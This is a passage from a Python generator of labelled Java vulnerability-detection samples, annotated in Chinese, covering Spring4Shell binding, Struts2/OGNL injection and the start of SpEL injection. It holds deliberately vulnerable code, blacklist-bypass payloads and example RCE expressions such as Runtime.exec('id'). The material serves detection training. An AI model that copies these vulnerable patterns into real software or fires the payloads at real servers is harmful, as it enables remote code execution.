            "    private ProfileService profileService;\n"
            "\n"
            "    @InitBinder(\"profile\")\n"
            "    public void initBinder(WebDataBinder binder) {\n"
            "        binder.setAllowedFields(\"displayName\", \"bio\", \"phone\", \"address.city\", \"address.country\");\n"
            "    }\n"
            "\n"
            "    @PostMapping(\"/profile/update\")\n"
            "    public String update(@ModelAttribute(\"profile\") Profile profile) {\n"
            "        profileService.update(profile);\n"
            "        return \"redirect:/profile\";\n"
            "    }\n"
            "}"
        ),
        "analysis": (
            "分析过程：\n"
            "1. 污染源识别：line 12 @ModelAttribute(\"profile\") Profile profile，HTTP 参数尝试自动绑定。\n"
            "2. 危险 sink 定位：line 12 自动数据绑定过程。\n"
            "3. 数据流追踪：HTTP 参数 -> line 8 setAllowedFields 白名单仅允许 displayName/bio/phone/"
            "address.city/address.country -> class.* 和 address.class.* 均不在白名单 -> 绑定被拒绝。\n"
            "4. 防御评估：白名单精确到嵌套属性级别（address.city, address.country），"
            "既允许正常业务绑定，又阻止了 class.module.classLoader 和 address.class.module.classLoader 攻击路径。\n"
            "5. 结论：防御有效，无漏洞。"
        ),
        "verdict": {
            "has_vulnerability": False,
            "vulnerability_type": "none",
            "risk_level": "None",
            "source": "N/A",
            "sink": "N/A",
            "explanation": "line 8 setAllowedFields 白名单精确到嵌套属性 -> class.* 和 address.class.* 不在白名单 -> Spring4Shell 攻击链被阻断，嵌套属性也被保护",
            "fix_suggestion": "no fix needed",
        },
    })

    return samples


# ===========================================================================
# 2. OGNL 表达式注入（15 条）
#    CWE-917 Improper Neutralization of Special Elements
#    基于 CVE-2013-2251 (Apache Struts2)
# ===========================================================================
def gen_ognl():
    """生成 15 条 OGNL 表达式注入样本（12 漏洞 + 3 安全）。"""
    samples = []

    # ------------------------------------------------------------------
    # 2.1 Struts2 场景（5 条漏洞）
    # ------------------------------------------------------------------

    # --- O1: Struts2 redirect: 拼接用户输入 ---
    samples.append({
        "lang": "java",
        "code": (
            "public class RedirectAction extends ActionSupport {\n"
            "    private String target;\n"
            "\n"
            "    public void setTarget(String target) {\n"
            "        this.target = target;\n"
            "    }\n"
            "\n"
            "    public String getTarget() {\n"
            "        return target;\n"
            "    }\n"
            "\n"
            "    public String execute() {\n"
            "        return \"redirect:\" + target;\n"
            "    }\n"
            "}"
        ),
        "analysis": (
            "分析过程：\n"
            "1. 污染源识别：line 4 setTarget(String target)，HTTP 参数 target 经 setter 注入。\n"
            "2. 危险 sink 定位：line 13 return \"redirect:\" + target，Struts2 对 redirect: 前缀后的内容进行 OGNL 求值。\n"
            "3. 数据流追踪：HTTP 参数 target=%{OGNL} -> line 4 setter -> line 13 \"redirect:\" + target -> "
            "Struts2 解析 redirect: 前缀 -> 对 %{...} 执行 OGNL 求值 -> RCE。\n"
            "4. 防御检查：无输入校验，用户输入直接进入 redirect 结果。\n"
            "5. 结论：存在 CWE-917 OGNL 表达式注入，风险等级 Critical（CVE-2013-2251 利用模式）。"
        ),
        "verdict": {
            "has_vulnerability": True,
            "vulnerability_type": "CWE-917 Improper Neutralization of Special Elements",
            "risk_level": "Critical",
            "source": "line 4: setTarget(String target)（HTTP 参数 target 经 setter 注入）",
            "sink": "line 13: return \"redirect:\" + target（Struts2 对 redirect: 后内容做 OGNL 求值）",
            "explanation": "HTTP 参数 target=%{OGNL} -> line 4 setter -> line 13 \"redirect:\"+target -> Struts2 OGNL 求值 -> RCE（CVE-2013-2251）",
            "fix_suggestion": "line 13 不使用 redirect: 拼接用户输入，改为 return SUCCESS 并在配置中用固定 redirect 结果，或对 target 做白名单 URL 校验",
        },
    })

    # --- O2: Struts2 ValueStack.findValue 用户输入 ---
    samples.append({
        "lang": "java",
        "code": (
            "public class DynamicAction extends ActionSupport {\n"
            "    private String expression;\n"
            "\n"
            "    public void setExpression(String expression) {\n"
            "        this.expression = expression;\n"
            "    }\n"
            "\n"
            "    public String execute() {\n"
            "        ValueStack stack = ActionContext.getContext().getValueStack();\n"
            "        Object result = stack.findValue(expression);\n"
            "        addActionMessage(String.valueOf(result));\n"
            "        return SUCCESS;\n"
            "    }\n"
            "}"
        ),
        "analysis": (
            "分析过程：\n"
            "1. 污染源识别：line 4 setExpression(String expression)，HTTP 参数 expression 经 setter 注入。\n"
            "2. 危险 sink 定位：line 10 stack.findValue(expression)，ValueStack.findValue 对传入字符串做 OGNL 求值。\n"
            "3. 数据流追踪：HTTP 参数 expression=@java.lang.Runtime@getRuntime().exec('id') -> "
            "line 4 setter -> line 10 findValue -> OGNL 求值 -> RCE。\n"
            "4. 防御检查：无输入校验，expression 直接传入 findValue。\n"
            "5. 结论：存在 CWE-917 OGNL 表达式注入，风险等级 Critical。"
        ),
        "verdict": {
            "has_vulnerability": True,
            "vulnerability_type": "CWE-917 Improper Neutralization of Special Elements",
            "risk_level": "Critical",
            "source": "line 4: setExpression(String expression)（HTTP 参数 expression 经 setter 注入）",
            "sink": "line 10: stack.findValue(expression)（ValueStack.findValue 对用户输入做 OGNL 求值）",
            "explanation": "HTTP 参数 expression=@java.lang.Runtime@... -> line 4 setter -> line 10 findValue OGNL 求值 -> RCE",
            "fix_suggestion": "line 10 不使用 findValue 求值用户输入，改为预定义属性名映射或对 expression 做白名单校验（仅允许字母数字下划线）",
        },
    })

    # --- O3: Struts2 @Result 注解 %{nextAction} OGNL ---
    samples.append({
        "lang": "java",
        "code": (
            "@Results({\n"
            "    @Result(name = \"success\", type = \"redirectAction\",\n"
            "            params = {\"actionName\", \"%{nextAction}\"})\n"
            "})\n"
            "public class WorkflowAction extends ActionSupport {\n"
            "    private String nextAction;\n"
            "\n"
            "    public void setNextAction(String nextAction) {\n"
            "        this.nextAction = nextAction;\n"
            "    }\n"
            "\n"
            "    public String execute() {\n"
            "        return SUCCESS;\n"
            "    }\n"
            "}"
        ),
        "analysis": (
            "分析过程：\n"
            "1. 污染源识别：line 8 setNextAction(String nextAction)，HTTP 参数 nextAction 经 setter 注入。\n"
            "2. 危险 sink 定位：line 3 @Result params = {\"actionName\", \"%{nextAction}\"}，"
            "Struts2 对 %{nextAction} 做 OGNL 求值获取实际 actionName。\n"
            "3. 数据流追踪：HTTP 参数 nextAction=%{OGNL} -> line 8 setter -> line 3 %{nextAction} 求值 -> OGNL 执行 -> RCE。\n"
            "4. 防御检查：@Result 注解中使用 %{...} 引用用户可控属性，无输入校验。\n"
            "5. 结论：存在 CWE-917 OGNL 表达式注入，风险等级 Critical。"
        ),
        "verdict": {
            "has_vulnerability": True,
            "vulnerability_type": "CWE-917 Improper Neutralization of Special Elements",
            "risk_level": "Critical",
            "source": "line 8: setNextAction(String nextAction)（HTTP 参数 nextAction 经 setter 注入）",
            "sink": "line 3: @Result(params = {\"actionName\", \"%{nextAction}\"})（Struts2 对 %{nextAction} 做 OGNL 求值）",
            "explanation": "HTTP 参数 nextAction=%{OGNL} -> line 8 setter -> line 3 %{nextAction} OGNL 求值 -> RCE",
            "fix_suggestion": "line 3 不使用 %{nextAction} 引用用户可控属性，改为固定 actionName 或对 nextAction 做白名单校验",
        },
    })

    # --- O4: Struts2 拦截器 findValue 用户输入 ---
    samples.append({
        "lang": "java",
        "code": (
            "public class CustomInterceptor extends AbstractInterceptor {\n"
            "    @Override\n"
            "    public String intercept(ActionInvocation invocation) throws Exception {\n"
            "        ActionContext ctx = invocation.getInvocationContext();\n"
            "        String redirect = ctx.getParameters().get(\"redirect\").getValue();\n"
            "        if (redirect != null) {\n"
            "            ValueStack stack = ctx.getValueStack();\n"
            "            stack.set(\"redirectUrl\", stack.findValue(redirect));\n"
            "        }\n"
            "        return invocation.invoke();\n"
            "    }\n"
            "}"
        ),
        "analysis": (
            "分析过程：\n"
            "1. 污染源识别：line 5 ctx.getParameters().get(\"redirect\").getValue()，HTTP 参数 redirect 用户可控。\n"
            "2. 危险 sink 定位：line 8 stack.findValue(redirect)，对用户输入做 OGNL 求值。\n"
            "3. 数据流追踪：HTTP 参数 redirect=@java.lang.Runtime@... -> line 5 获取 -> "
            "line 8 findValue(redirect) OGNL 求值 -> RCE。\n"
            "4. 防御检查：无输入校验，直接将 HTTP 参数传入 findValue。\n"
            "5. 结论：存在 CWE-917 OGNL 表达式注入，风险等级 Critical。"
        ),
        "verdict": {
            "has_vulnerability": True,
            "vulnerability_type": "CWE-917 Improper Neutralization of Special Elements",
            "risk_level": "Critical",
            "source": "line 5: ctx.getParameters().get(\"redirect\").getValue()（HTTP 参数 redirect 用户可控）",
            "sink": "line 8: stack.findValue(redirect)（对用户输入做 OGNL 求值）",
            "explanation": "HTTP 参数 redirect=@java.lang.Runtime@... -> line 5 获取 -> line 8 findValue OGNL 求值 -> RCE",
            "fix_suggestion": "line 8 不对用户输入调用 findValue，改为从预定义属性映射中查找，或对 redirect 做白名单校验",
        },
    })

    # --- O5: Struts2 findValue 拼接用户输入 ---
    samples.append({
        "lang": "java",
        "code": (
            "public class ConfigAction extends ActionSupport {\n"
            "    private String property;\n"
            "\n"
            "    public void setProperty(String property) {\n"
            "        this.property = property;\n"
            "    }\n"
            "\n"
            "    public String execute() {\n"
            "        ValueStack stack = ActionContext.getContext().getValueStack();\n"
            "        Object value = stack.findValue(\"config.\" + property);\n"
            "        addActionMessage(String.valueOf(value));\n"
            "        return SUCCESS;\n"
            "    }\n"
            "}"
        ),
        "analysis": (
            "分析过程：\n"
            "1. 污染源识别：line 4 setProperty(String property)，HTTP 参数 property 经 setter 注入。\n"
            "2. 危险 sink 定位：line 10 stack.findValue(\"config.\" + property)，拼接后整体做 OGNL 求值。\n"
            "3. 数据流追踪：HTTP 参数 property=['@java.lang.Runtime@getRuntime().exec(\"id\")'] -> "
            "line 4 setter -> line 10 \"config.\" + property 拼接 -> findValue OGNL 求值 -> "
            "OGNL 解析 config[expr] 中的 expr -> RCE。\n"
            "4. 防御检查：无输入校验，property 拼入 OGNL 表达式字符串。\n"
            "5. 结论：存在 CWE-917 OGNL 表达式注入，风险等级 Critical。拼接用户输入到 OGNL 表达式中同样危险。"
        ),
        "verdict": {
            "has_vulnerability": True,
            "vulnerability_type": "CWE-917 Improper Neutralization of Special Elements",
            "risk_level": "Critical",
            "source": "line 4: setProperty(String property)（HTTP 参数 property 经 setter 注入）",
            "sink": "line 10: stack.findValue(\"config.\" + property)（拼接用户输入后做 OGNL 求值）",
            "explanation": "HTTP 参数 property=['@java.lang.Runtime@...'] -> line 4 setter -> line 10 \"config.\"+property OGNL 求值 -> RCE",
            "fix_suggestion": "line 10 不拼接用户输入到 OGNL 表达式，改为对 property 做白名单校验后用固定表达式查找",
        },
    })

    # ------------------------------------------------------------------
    # 2.2 直接调用 OgnlUtil/getValue 求值用户输入（4 条漏洞）
    # ------------------------------------------------------------------

    # --- O6: OgnlUtil.getValue 用户输入 ---
    samples.append({
        "lang": "java",
        "code": (
            "public class ExpressionService {\n"
            "    private OgnlUtil ognlUtil;\n"
            "\n"
            "    public Object evaluate(String expression) {\n"
            "        Map<String, Object> context = Ognl.createDefaultContext(null);\n"
            "        return ognlUtil.getValue(expression, context);\n"
            "    }\n"
            "}"
        ),
        "analysis": (
            "分析过程：\n"
            "1. 污染源识别：line 4 evaluate(String expression)，expression 来自 API/RPC 调用方，用户可控。\n"
            "2. 危险 sink 定位：line 6 ognlUtil.getValue(expression, context)，直接对用户输入做 OGNL 求值。\n"
            "3. 数据流追踪：expression=@java.lang.Runtime@getRuntime().exec('id') -> "
            "line 6 getValue OGNL 求值 -> RCE。\n"
            "4. 防御检查：无输入校验，无沙箱限制。\n"
            "5. 结论：存在 CWE-917 OGNL 表达式注入，风险等级 Critical。"
        ),
        "verdict": {
            "has_vulnerability": True,
            "vulnerability_type": "CWE-917 Improper Neutralization of Special Elements",
            "risk_level": "Critical",
            "source": "line 4: evaluate(String expression)（API/RPC 参数 expression 用户可控）",
            "sink": "line 6: ognlUtil.getValue(expression, context)（直接对用户输入做 OGNL 求值）",
            "explanation": "expression=@java.lang.Runtime@getRuntime().exec('id') -> line 6 getValue OGNL 求值 -> RCE",
            "fix_suggestion": "line 6 不使用 OGNL 求值用户输入，改为预定义表达式映射或对 expression 做白名单校验仅允许字母数字点号",
        },
    })

    # --- O7: OgnlUtil.setValue 用户输入 ---
    samples.append({
        "lang": "java",
        "code": (
            "public class PropertyService {\n"
            "    private OgnlUtil ognlUtil;\n"
            "\n"
            "    public void setProperty(Object target, String propertyPath, Object value) {\n"
            "        ognlUtil.setValue(propertyPath, target, value);\n"
            "    }\n"
            "}"
        ),
        "analysis": (
            "分析过程：\n"
            "1. 污染源识别：line 4 propertyPath 参数，来自 API 调用方，用户可控。\n"
            "2. 危险 sink 定位：line 5 ognlUtil.setValue(propertyPath, target, value)，对 propertyPath 做 OGNL 求值并赋值。\n"
            "3. 数据流追踪：propertyPath=#context[#root] -> line 5 setValue OGNL 求值 -> "
            "可修改 OGNL 上下文内部状态或调用危险方法。\n"
            "4. 防御检查：无输入校验。\n"
            "5. 结论：存在 CWE-917 OGNL 表达式注入，风险等级 Critical。"
        ),
        "verdict": {
            "has_vulnerability": True,
            "vulnerability_type": "CWE-917 Improper Neutralization of Special Elements",
            "risk_level": "Critical",
            "source": "line 4: setProperty(Object target, String propertyPath, Object value)（propertyPath 用户可控）",
            "sink": "line 5: ognlUtil.setValue(propertyPath, target, value)（对 propertyPath 做 OGNL 求值并赋值）",
            "explanation": "propertyPath=#context[#root] -> line 5 setValue OGNL 求值 -> 修改 OGNL 上下文内部状态或调用危险方法",
            "fix_suggestion": "line 5 不使用 OGNL setValue 处理用户输入，改为 PropertyUtils.setProperty 配合白名单校验",
        },
    })

    # --- O8: Ognl.parseExpression 用户输入 ---
    samples.append({
        "lang": "java",
        "code": (
            "public class OgnlEvaluator {\n"
            "    public Object parseAndEval(String expr, Object root) throws OgnlException {\n"
            "        Object parsed = Ognl.parseExpression(expr);\n"
            "        Map<String, Object> context = Ognl.createDefaultContext(root);\n"
            "        return Ognl.getValue(parsed, context, root);\n"
            "    }\n"
            "}"
        ),
        "analysis": (
            "分析过程：\n"
            "1. 污染源识别：line 2 parseAndEval(String expr, ...)，expr 来自调用方，用户可控。\n"
            "2. 危险 sink 定位：line 3 Ognl.parseExpression(expr) 解析 + line 5 Ognl.getValue 求值。\n"
            "3. 数据流追踪：expr=@java.lang.Runtime@getRuntime().exec('id') -> "
            "line 3 parseExpression 解析 -> line 5 getValue 求值 -> RCE。\n"
            "4. 防御检查：无输入校验，先解析后求值，用户输入贯穿整个 OGNL 管道。\n"
            "5. 结论：存在 CWE-917 OGNL 表达式注入，风险等级 Critical。"
        ),
        "verdict": {
            "has_vulnerability": True,
            "vulnerability_type": "CWE-917 Improper Neutralization of Special Elements",
            "risk_level": "Critical",
            "source": "line 2: parseAndEval(String expr, Object root)（expr 用户可控）",
            "sink": "line 5: Ognl.getValue(parsed, context, root)（对解析后的用户输入 OGNL 表达式求值）",
            "explanation": "expr=@java.lang.Runtime@getRuntime().exec('id') -> line 3 parseExpression -> line 5 getValue 求值 -> RCE",
            "fix_suggestion": "line 3-5 不使用 OGNL 解析用户输入，改为预编译表达式缓存 + 白名单校验 expr 仅含字母数字点号",
        },
    })

    # --- O9: Ognl.getValue 模板引擎 ---
    samples.append({
        "lang": "java",
        "code": (
            "import ognl.Ognl;\n"
            "import ognl.OgnlContext;\n"
            "\n"
            "public class TemplateEngine {\n"
            "    public String render(String template, Object context) throws Exception {\n"
            "        OgnlContext ctx = (OgnlContext) Ognl.createDefaultContext(context);\n"
            "        Object result = Ognl.getValue(template, ctx, context);\n"
            "        return String.valueOf(result);\n"
            "    }\n"
            "}"
        ),
        "analysis": (
            "分析过程：\n"
            "1. 污染源识别：line 5 render(String template, ...)，template 来自模板渲染请求，用户可控。\n"
            "2. 危险 sink 定位：line 7 Ognl.getValue(template, ctx, context)，对用户输入的模板做 OGNL 求值。\n"
            "3. 数据流追踪：template=@java.lang.Runtime@getRuntime().exec('id') -> "
            "line 7 getValue OGNL 求值 -> RCE。\n"
            "4. 防御检查：无输入校验，无 OGNL 安全限制。\n"
            "5. 结论：存在 CWE-917 OGNL 表达式注入，风险等级 Critical。"
        ),
        "verdict": {
            "has_vulnerability": True,
            "vulnerability_type": "CWE-917 Improper Neutralization of Special Elements",
            "risk_level": "Critical",
            "source": "line 5: render(String template, Object context)（template 用户可控）",
            "sink": "line 7: Ognl.getValue(template, ctx, context)（对用户输入模板做 OGNL 求值）",
            "explanation": "template=@java.lang.Runtime@getRuntime().exec('id') -> line 7 getValue OGNL 求值 -> RCE",
            "fix_suggestion": "line 7 不使用 OGNL 求值用户输入模板，改为使用安全模板引擎（如 FreeMarker 配合禁用 OGNL）或白名单校验",
        },
    })

    # ------------------------------------------------------------------
    # 2.3 防御迷惑：简单过滤可绕过（3 条漏洞）
    # ------------------------------------------------------------------

    # --- O10: 关键词黑名单（Runtime/exec/ProcessBuilder），字符串拼接绕过 ---
    samples.append({
        "lang": "java",
        "code": (
            "public class OgnlFilter {\n"
            "    private static final Set<String> BLACKLIST = Set.of(\"Runtime\", \"exec\", \"ProcessBuilder\");\n"
            "\n"
            "    public Object safeEval(String expression, Object root) throws Exception {\n"
            "        for (String keyword : BLACKLIST) {\n"
            "            if (expression.contains(keyword)) {\n"
            "                throw new SecurityException(\"Blocked: \" + keyword);\n"
            "            }\n"
            "        }\n"
            "        return Ognl.getValue(expression, Ognl.createDefaultContext(root), root);\n"
            "    }\n"
            "}"
        ),
        "analysis": (
            "分析过程：\n"
            "1. 污染源识别：line 4 safeEval(String expression, ...)，expression 用户可控。\n"
            "2. 危险 sink 定位：line 10 Ognl.getValue(expression, ...)，对过滤后的表达式做 OGNL 求值。\n"
            "3. 数据流追踪：expression 中不含 Runtime/exec/ProcessBuilder 关键词 -> line 6 contains 检查通过 -> "
            "line 10 getValue OGNL 求值 -> 攻击者使用 @java.lang.Class@forName('java.lang.Run'+'time') "
            "字符串拼接绕过关键词匹配 -> RCE。\n"
            "4. 防御检查：有 BLACKLIST 关键词过滤，但 OGNL 支持字符串拼接（如 'Run'+'time'），"
            "攻击者可拆分关键词绕过 contains 检查。黑名单方式天然不完整。\n"
            "5. 结论：存在 CWE-917 OGNL 表达式注入，风险等级 Critical。关键词黑名单可被 OGNL 字符串拼接绕过。"
        ),
        "verdict": {
            "has_vulnerability": True,
            "vulnerability_type": "CWE-917 Improper Neutralization of Special Elements",
            "risk_level": "Critical",
            "source": "line 4: safeEval(String expression, Object root)（expression 用户可控）",
            "sink": "line 10: Ognl.getValue(expression, ...)（关键词黑名单可被 OGNL 字符串拼接绕过）",
            "explanation": "expression 使用 @java.lang.Class@forName('Run'+'time') 拼接绕过 BLACKLIST -> line 6 contains 检查通过 -> line 10 getValue OGNL 求值 -> RCE",
            "fix_suggestion": "line 10 不使用 OGNL 求值用户输入，改为白名单正则 ^[a-zA-Z0-9_.]+$ 校验 expression 后再求值，关键词黑名单不可靠",
        },
    })

    # --- O11: replace #context 和 #_memberAccess，直接 @class 绕过 ---
    samples.append({
        "lang": "java",
        "code": (
            "public class OgnlSanitizer {\n"
            "    public Object safeEval(String expression, Object root) throws Exception {\n"
            "        String sanitized = expression.replace(\"#context\", \"\")\n"
            "                                      .replace(\"#_memberAccess\", \"\");\n"
            "        return Ognl.getValue(sanitized, Ognl.createDefaultContext(root), root);\n"
            "    }\n"
            "}"
        ),
        "analysis": (
            "分析过程：\n"
            "1. 污染源识别：line 2 safeEval(String expression, ...)，expression 用户可控。\n"
            "2. 危险 sink 定位：line 5 Ognl.getValue(sanitized, ...)，对过滤后的表达式做 OGNL 求值。\n"
            "3. 数据流追踪：expression=@java.lang.Runtime@getRuntime().exec('id') -> "
            "line 3-4 replace 不影响此表达式（不含 #context 和 #_memberAccess）-> "
            "line 5 getValue OGNL 求值 -> RCE。\n"
            "4. 防御检查：仅过滤了 #context 和 #_memberAccess 两个 OGNL 变量，"
            "但 @java.lang.Runtime@getRuntime() 静态方法调用不需要这两个变量，过滤无效。\n"
            "5. 结论：存在 CWE-917 OGNL 表达式注入，风险等级 Critical。局部变量过滤不能阻止静态方法调用。"
        ),
        "verdict": {
            "has_vulnerability": True,
            "vulnerability_type": "CWE-917 Improper Neutralization of Special Elements",
            "risk_level": "Critical",
            "source": "line 2: safeEval(String expression, Object root)（expression 用户可控）",
            "sink": "line 5: Ognl.getValue(sanitized, ...)（仅过滤 #context/#_memberAccess，@class 静态调用不受影响）",
            "explanation": "expression=@java.lang.Runtime@getRuntime().exec('id') -> line 3-4 replace 不影响 -> line 5 getValue OGNL 求值 -> RCE（防御迷惑：局部变量过滤无效）",
            "fix_suggestion": "line 5 不使用 OGNL 求值用户输入，改为白名单正则校验仅允许字母数字点号，replace 过滤不可靠",
        },
    })

    # --- O12: 正则过滤 #@&，new 操作符绕过 ---
    samples.append({
        "lang": "java",
        "code": (
            "public class OgnlGuard {\n"
            "    private static final Pattern OGNL_PATTERN = Pattern.compile(\"[#@\\\\$]\");\n"
            "\n"
            "    public Object safeEval(String expression, Object root) throws Exception {\n"
            "        if (OGNL_PATTERN.matcher(expression).find()) {\n"
            "            throw new SecurityException(\"OGNL special characters detected\");\n"
            "        }\n"
            "        return Ognl.getValue(expression, Ognl.createDefaultContext(root), root);\n"
            "    }\n"
            "}"
        ),
        "analysis": (
            "分析过程：\n"
            "1. 污染源识别：line 4 safeEval(String expression, ...)，expression 用户可控。\n"
            "2. 危险 sink 定位：line 8 Ognl.getValue(expression, ...)，对过滤后的表达式做 OGNL 求值。\n"
            "3. 数据流追踪：expression=(new java.lang.ProcessBuilder(new String[]{'id'})).start() -> "
            "line 5 正则检查 [#@&] 不匹配（不含 # @ $）-> line 8 getValue OGNL 求值 -> "
            "OGNL new 操作符创建 ProcessBuilder -> RCE。\n"
            "4. 防御检查：正则过滤了 # @ $ 三个 OGNL 特殊字符，但 OGNL 的 new 操作符和点号方法调用不需要这些字符，"
            "攻击者可使用 new java.lang.ProcessBuilder(...) 绕过。\n"
            "5. 结论：存在 CWE-917 OGNL 表达式注入，风险等级 Critical。字符过滤不完整。"
        ),
        "verdict": {
            "has_vulnerability": True,
            "vulnerability_type": "CWE-917 Improper Neutralization of Special Elements",
            "risk_level": "Critical",
            "source": "line 4: safeEval(String expression, Object root)（expression 用户可控）",
            "sink": "line 8: Ognl.getValue(expression, ...)（正则 [#@&] 过滤可被 new 操作符绕过）",
            "explanation": "expression=(new java.lang.ProcessBuilder(new String[]{'id'})).start() -> line 5 正则不匹配 -> line 8 getValue OGNL 求值 -> RCE（防御迷惑：字符过滤不完整）",
            "fix_suggestion": "line 8 不使用 OGNL 求值用户输入，改为白名单正则 ^[a-zA-Z0-9_.]+$ 校验，禁止 new 操作符和特殊字符",
        },
    })

    # ------------------------------------------------------------------
    # 2.4 安全版本（3 条安全）
    # ------------------------------------------------------------------

    # --- O13: 白名单正则校验 ---
    samples.append({
        "lang": "java",
        "code": (
            "public class SafeOgnlService {\n"
            "    private static final Pattern SAFE_PATTERN = Pattern.compile(\"^[a-zA-Z0-9_.]+$\");\n"
            "\n"
            "    public Object safeEval(String expression, Object root) throws Exception {\n"
            "        if (!SAFE_PATTERN.matcher(expression).matches()) {\n"
            "            throw new SecurityException(\"Invalid expression\");\n"
            "        }\n"
            "        return Ognl.getValue(expression, Ognl.createDefaultContext(root), root);\n"
            "    }\n"
            "}"
        ),
        "analysis": (
            "分析过程：\n"
            "1. 污染源识别：line 4 safeEval(String expression, ...)，expression 理论上用户可控。\n"
            "2. 危险 sink 定位：line 8 Ognl.getValue(expression, ...)，OGNL 求值。\n"
            "3. 数据流追踪：expression -> line 5 SAFE_PATTERN.matches() 白名单校验 -> "
            "仅允许字母/数字/下划线/点号 -> @ # $ new 等危险语法均无法通过 -> line 8 getValue 安全求值。\n"
            "4. 防御评估：白名单正则 ^[a-zA-Z0-9_.]+$ 仅允许简单属性路径（如 user.name），"
            "OGNL 静态方法调用 @class@method、new 操作符、# 变量引用等危险语法均被拒绝，防御有效。\n"
            "5. 结论：白名单校验有效，无 OGNL 注入风险。"
        ),
        "verdict": {
            "has_vulnerability": False,
            "vulnerability_type": "none",
            "risk_level": "None",
            "source": "N/A",
            "sink": "N/A",
            "explanation": "line 5 SAFE_PATTERN.matches() 白名单仅允许 [a-zA-Z0-9_.] -> @ # $ new 等危险语法被拒绝 -> line 8 getValue 安全求值属性路径",
            "fix_suggestion": "no fix needed",
        },
    })

    # --- O14: 预定义表达式映射 ---
    samples.append({
        "lang": "java",
        "code": (
            "public class TemplateRenderService {\n"
            "    private static final Map<String, String> TEMPLATES = Map.of(\n"
            "        \"greeting\", \"Hello, #name\",\n"
            "        \"farewell\", \"Goodbye, #name\"\n"
            "    );\n"
            "\n"
            "    public String render(String templateName, Object context) throws Exception {\n"
            "        String template = TEMPLATES.get(templateName);\n"
            "        if (template == null) {\n"
            "            throw new IllegalArgumentException(\"Unknown template\");\n"
            "        }\n"
            "        return String.valueOf(Ognl.getValue(template, Ognl.createDefaultContext(context), context));\n"
            "    }\n"
            "}"
        ),
        "analysis": (
            "分析过程：\n"
            "1. 污染源识别：line 7 render(String templateName, ...)，templateName 来自用户请求。\n"
            "2. 危险 sink 定位：line 12 Ognl.getValue(template, ...)，OGNL 求值。\n"
            "3. 数据流追踪：templateName -> line 8 TEMPLATES.get(templateName) 从预定义映射查找 -> "
            "template 为固定字符串 \"Hello, #name\" 或 \"Goodbye, #name\" -> line 12 getValue 求值固定表达式。\n"
            "4. 防御评估：用户输入 templateName 仅作为映射 key 查找，不直接进入 OGNL 表达式。"
            "实际求值的 template 来自代码中硬编码的 TEMPLATES 映射，攻击者无法控制 OGNL 表达式内容。\n"
            "5. 结论：预定义表达式映射有效隔离了用户输入，无 OGNL 注入风险。"
        ),
        "verdict": {
            "has_vulnerability": False,
            "vulnerability_type": "none",
            "risk_level": "None",
            "source": "N/A",
            "sink": "N/A",
            "explanation": "line 8 TEMPLATES.get(templateName) 预定义映射查找 -> template 为硬编码固定表达式 -> 用户输入不进入 OGNL 求值",
            "fix_suggestion": "no fix needed",
        },
    })

    # --- O15: 使用 PropertyUtils 替代 OGNL ---
    samples.append({
        "lang": "java",
        "code": (
            "public class SafeExpressionService {\n"
            "    private static final Set<String> ALLOWED_PROPERTIES = Set.of(\"name\", \"email\", \"phone\");\n"
            "\n"
            "    public Object getProperty(Object target, String propertyName) {\n"
            "        if (!ALLOWED_PROPERTIES.contains(propertyName)) {\n"
            "            throw new SecurityException(\"Property not allowed: \" + propertyName);\n"
            "        }\n"
            "        try {\n"
            "            return PropertyUtils.getProperty(target, propertyName);\n"
            "        } catch (Exception e) {\n"
            "            throw new RuntimeException(\"Failed to get property\", e);\n"
            "        }\n"
            "    }\n"
            "}"
        ),
        "analysis": (
            "分析过程：\n"
            "1. 污染源识别：line 4 getProperty(Object target, String propertyName)，propertyName 来自用户请求。\n"
            "2. 危险 sink 定位：line 9 PropertyUtils.getProperty(target, propertyName)，Bean 属性读取。\n"
            "3. 数据流追踪：propertyName -> line 5 ALLOWED_PROPERTIES.contains 白名单校验 -> "
            "仅允许 name/email/phone -> line 9 PropertyUtils.getProperty 读取 Bean 属性。\n"
            "4. 防御评估：(a) 白名单 ALLOWED_PROPERTIES 仅允许三个属性名；"
            "(b) PropertyUtils.getProperty 是标准 Bean 属性反射读取，不支持 OGNL 表达式语法（@ # new 等），"
            "即使绕过白名单也无法执行任意 OGNL。双重防御有效。\n"
            "5. 结论：白名单 + PropertyUtils 替代 OGNL，无表达式注入风险。"
        ),
        "verdict": {
            "has_vulnerability": False,
            "vulnerability_type": "none",
            "risk_level": "None",
            "source": "N/A",
            "sink": "N/A",
            "explanation": "line 5 ALLOWED_PROPERTIES.contains 白名单 + line 9 PropertyUtils.getProperty（非 OGNL 求值）-> 双重防御，无表达式注入",
            "fix_suggestion": "no fix needed",
        },
    })

    return samples


# ===========================================================================
# 3. SpEL 表达式注入（10 条）
#    CWE-917 Improper Neutralization of Special Elements
# ===========================================================================
def gen_spel():
    """生成 10 条 SpEL 表达式注入样本（9 漏洞 + 1 安全）。"""
    samples = []

    # ------------------------------------------------------------------
    # 3.1 直接 SpelExpressionParser 解析用户输入（4 条漏洞）
    # ------------------------------------------------------------------

    # --- SP1: SpelExpressionParser.parseExpression 用户输入 ---
    samples.append({
        "lang": "java",
        "code": (
            "import org.springframework.expression.Expression;\n"
            "import org.springframework.expression.spel.standard.SpelExpressionParser;\n"
            "\n"
            "public class SpelService {\n"
            "    private final SpelExpressionParser parser = new SpelExpressionParser();\n"
            "\n"
            "    public Object evaluate(String expression) {\n"
            "        Expression expr = parser.parseExpression(expression);\n"
            "        return expr.getValue();\n"
            "    }\n"
            "}"
        ),
        "analysis": (
            "分析过程：\n"
            "1. 污染源识别：line 7 evaluate(String expression)，expression 来自 API 调用方，用户可控。\n"
            "2. 危险 sink 定位：line 8 parser.parseExpression(expression) 解析 + line 9 expr.getValue() 求值。\n"
            "3. 数据流追踪：expression=T(java.lang.Runtime).getRuntime().exec('id') -> "
            "line 8 parseExpression 解析 -> line 9 getValue 求值 -> SpEL T() 类型引用调用 Runtime.exec -> RCE。\n"
            "4. 防御检查：使用默认 StandardEvaluationContext（getValue() 无参时内部创建），无安全限制。\n"
            "5. 结论：存在 CWE-917 SpEL 表达式注入，风险等级 Critical。"
        ),
        "verdict": {
            "has_vulnerability": True,
            "vulnerability_type": "CWE-917 Improper Neutralization of Special Elements",
            "risk_level": "Critical",
            "source": "line 7: evaluate(String expression)（API 参数 expression 用户可控）",
            "sink": "line 8-9: parser.parseExpression(expression).getValue()（SpEL 求值用户输入，默认 StandardEvaluationContext 无限制）",
            "explanation": "expression=T(java.lang.Runtime).getRuntime().exec('id') -> line 8 parseExpression -> line 9 getValue SpEL T() 类型引用 -> RCE",
